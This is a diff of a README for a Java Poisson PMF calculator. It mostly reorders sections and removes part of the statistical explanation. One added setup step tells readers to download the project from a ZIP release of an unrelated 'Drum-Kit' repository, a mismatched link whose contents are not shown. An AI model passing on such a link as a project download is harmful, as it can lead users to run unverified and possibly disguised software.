@@ -14,18 +14,11 @@ It bridges:
 - 📊 Real-world applications  
 
 ---
+## 🧮 Mathematical Foundation
 
-## 📂 Project Structure
+The Poisson PMF is given by:
 
-```
-Poisson-PMF/
-│── Main.java              # Handles user input
-│── PoissonPMF.java       # Core PMF logic
-│── images/
-│     ├── Example.png     # Output preview
-│     └── Graph.png       # Distribution visualization
-│── README.md
-```
+**P(X = k) = (e^(-λ) × λ^k) / k!**
 
 ---
 
@@ -46,22 +39,49 @@ Poisson-PMF/
 > This graph shows how probability varies with different values of **k** for a fixed λ.
 
 ---
+## 📂 Project Structure
 
-## 🧮 Mathematical Foundation
+```
+Poisson-PMF/
+│── Main.java              # Handles user input
+│── PoissonPMF.java       # Core PMF logic
+│── images/
+│     ├── Example.png     # Output preview
+│     └── Graph.png       # Distribution visualization
+│── README.md
+```
 
-The Poisson PMF is given by:
+---
+## ⚙️ Local Setup
 
-**P(X = k) = (e^(-λ) × λ^k) / k!**
+### 🔹 Option 1: Clone Repository
+
+```bash
+git clone https://github.com/your-username/poisson-pmf.git
+cd poisson-pmf
+javac Main.java
+java Main
+```
 
 ---
 
-## 🧠 Deep Statistical Explanation (GSoC Level)
+### 🔹 Option 2: Download ZIP
 
-The **Poisson Distribution** is derived as a limiting case of the **Binomial Distribution**:
+Download the project directly:  
+👉 https://github.com/Akash-Wakade-7008-alt/Drum-Kit/releases/download/Drum-Kit-v1.0/Drum-Kit.zip
 
-\[
-\lim_{n \to \infty, \, p \to 0} \text{Binomial}(n, p) = \text{Poisson}(\lambda = np)
-\]
+1. Click **Download ZIP** button above  
+2. Extract the folder  
+3. Run:
+
+```bash
+javac Main.java
+java Main
+```
+
+---
+
+
 
 ### 🔍 Intuition
 
@@ -70,13 +90,6 @@ The **Poisson Distribution** is derived as a limiting case of the **Binomial Dis
 
 ---
 
-### 📌 Properties
-
-- **Mean (Expected Value)** = λ  
-- **Variance** = λ  
-- **Standard Deviation** = √λ  
-
----
 
 ### ⚙️ Real-World Interpretation
 
@@ -99,31 +112,6 @@ The **Poisson Distribution** is derived as a limiting case of the **Binomial Dis
 
 ---
 
-## ⚙️ Local Setup
-
-### 🔹 Option 1: Clone Repository
-
-```bash
-git clone https://github.com/your-username/poisson-pmf.git
-cd poisson-pmf
-javac Main.java
-java Main
-```
-
----
-
-### 🔹 Option 2: Download ZIP
-
-1. Click **Download ZIP** button above  
-2. Extract the folder  
-3. Run:
-
-```bash
-javac Main.java
-java Main
-```
-
----
 
 ## 💻 Example
 
@@ -162,7 +150,9 @@ This implementation ensures:
 
 ```bash
 git checkout -b feature/your-feature
+
 git commit -m "Add feature"
+
 git push origin feature/your-feature
 ```
 
